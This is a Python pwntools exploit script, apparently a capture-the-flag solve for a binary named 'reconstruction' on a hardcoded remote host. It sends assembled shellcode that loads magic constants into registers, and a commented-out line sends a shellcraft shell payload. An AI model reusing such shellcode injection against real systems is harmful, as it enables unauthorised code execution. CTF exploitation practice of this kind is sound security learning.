#!/usr/bin/env python3

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'reconstruction')

host = args.HOST or '94.237.50.250'
port = int(args.PORT or 36116)

context.terminal = ["tmux", "split","-h"]

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

prompt_prefix = b": "
cmd_prefix = b"> "

def prompt(m,**kwargs):
    r = kwargs.pop("io",io)
    prefix = kwargs.pop("prefix",prompt_prefix)
    line = kwargs.pop("line",True)
    if prefix is not None:
        if line:
            r.sendlineafter(prefix,m,**kwargs)
        else:
            r.sendafter(prefix,m,**kwargs)
    else:
        if line:
            r.sendline(m,**kwargs)
        else:
            r.send(m,**kwargs)

def prompti(i,**kwargs):
    prompt(f"{i}".encode(),**kwargs)

def cmd(i,**kwargs):
    prefix = kwargs.pop("prefix",cmd_prefix)
    prompti(i,prefix=prefix,**kwargs)

def upk(m,**kwargs):
    return unpack(m,"all",**kwargs)

def printx(**kwargs):
    for k,v in kwargs.items():
        log.critical(f"{k}: 0x{v:x}")

def docker_gdb_attach():
    pid = client.containers.get(docker_id).top()["Processes"][-1][1]
    with open("./gdbscript","w") as cmds:
        cmds.write(gdbscript)
    dbg = process(context.terminal + ["gdb","-pid",f"{pid}","-x","./gdbscript"])
    sleep(2)



io = start()
io.sendafter(b": ",b"fix")
sh = """
mov r8, 0x1337c0de
mov r9, 0xdeadbeef
mov r10, 0xdead1337
mov r12, 0x1337cafe
mov r13, 0xbeefc0de
mov r15, 0x1337dead
"""
sleep(1)
io.send(asm(sh).ljust(0x3b,b"\xc3"))
#sleep(1)
#io.sendline(asm(shellcraft.sh()))

io.interactive()
